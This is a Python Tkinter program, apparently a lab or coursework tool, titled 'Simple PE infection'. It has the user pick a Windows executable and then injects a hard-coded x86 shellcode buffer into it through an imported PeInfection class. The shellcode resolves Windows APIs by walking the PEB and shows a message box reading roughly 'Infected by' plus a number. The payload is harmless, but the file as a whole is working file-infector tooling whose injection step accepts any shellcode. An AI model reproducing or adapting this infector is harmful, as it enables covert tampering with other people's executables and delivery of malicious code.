from tkinter import Frame, Tk, Button, filedialog, Entry, END, Checkbutton, W, messagebox
from lib.peinfection import PeInfection


class PeInfectionApp(Frame):
    def __init__(self, master=None, **kw):
        super().__init__(master=master, **kw)

        self.master: Tk = master
        self.master.title("Simple PE infection")
        self.master.configure(background="white")
        self.configure(background="white")

        self.path_pefile = ""

        self.grid(padx=10, pady=10)
        self.create_wg()

    def create_wg(self):
        self.btn_selectpath = Button(
            self,
            text="Choose...",
            command=self.btn_selectpath_click,
            bg="#34495E",
            fg="white",
        )
        self.btn_selectpath.grid(row=0, column=0, sticky=W)

        self.et_filename = Entry(self)
        self.et_filename.grid(row=0, column=1, padx=(10, 0), ipadx=100)

        # self.cb_isAnti = Checkbutton(
        #     self, text="Use anti-vm, anti-debug", bg="white")
        # self.cb_isAnti.grid(row=1, column=0, columnspan=2, sticky=W)

        self.btn_infect = Button(
            self,
            text="Infect now",
            command=self.btn_infect_click,
            bg="#34495E",
            fg="white",
        )
        self.btn_infect.grid(row=2, column=0, columnspan=2)

    def btn_selectpath_click(self):
        selected_filename = filedialog.askopenfilename(
            title="Select pe file to infect",
            filetypes=(("PE file", "*.exe"), ("All file", "*.*")),
        )

        if selected_filename != "":
            self.path_pefile = selected_filename
            self.et_filename.delete(0, END)
            self.et_filename.insert(0, self.path_pefile)

    def btn_infect_click(self):
        if self.path_pefile == "":
            messagebox.showerror("Error", "Please select pe file to inject")
            return

        selected_filename = filedialog.asksaveasfilename(
            title="Save file as", filetypes=(("PE file", "*.exe"), ("All file", "*.*")),
        )

        if selected_filename != "":
            buf = b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9"
            buf += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
            buf += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
            buf += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
            buf += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
            buf += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
            buf += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
            buf += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
            buf += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
            buf += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
            buf += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
            buf += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
            buf += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
            buf += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
            buf += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
            buf += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
            buf += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
            buf += b"\x24\x0a\x89\xe3\x68\x33\x58\x20\x20\x68\x32\x30\x32"
            buf += b"\x39\x68\x5f\x31\x37\x35\x68\x30\x34\x34\x34\x68\x31"
            buf += b"\x37\x35\x32\x68\x20\x62\x79\x20\x68\x63\x74\x65\x64"
            buf += b"\x68\x49\x6e\x66\x65\x31\xc9\x88\x4c\x24\x1d\x89\xe1"
            buf += b"\x31\xd2\x52\x53\x51\x52\xff\xd0"

            pe = PeInfection(self.path_pefile, selected_filename)
            pe.infect(shellcode=buf)

            messagebox.showinfo("Successfuly", "Infected shellcode to pe file")


if __name__ == "__main__":
    root = Tk()
    PeInfectionApp(root)
    root.mainloop()
